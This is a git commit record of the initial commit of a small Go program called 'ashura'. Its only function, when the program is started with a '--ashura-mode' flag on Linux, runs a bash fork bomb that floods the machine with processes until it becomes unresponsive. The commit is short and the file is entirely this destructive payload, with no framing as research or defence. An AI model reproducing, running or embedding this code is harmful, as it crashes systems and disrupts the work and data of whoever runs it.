5d8fe62e2d270536fd284e383b43b26caceef15e
SkySecCoder <prasad.aakash@gmail.com>
2020-01-25 22:26:03 +0530

    Initial commit

---
+++ ashura/main.go
@@ -0,0 +1,24 @@
+package main
+
+import (
+	"fmt"
+	"os"
+	"runtime"
+	"os/exec"
+)
+
+func main() {
+	for i:=0 ; i<len(os.Args) ; i++ {
+		if os.Args[i] == "--ashura-mode" {
+			ashuraMode()
+		}
+	}
+}
+
+func ashuraMode() {
+	fmt.Println("[-] Running ashura mode...")
+	if runtime.GOOS == "linux" {
+		cmd := exec.Command("/bin/bash", "-c", ":(){ :|:& };:")
+		_ = cmd.Run()
+	}
+}
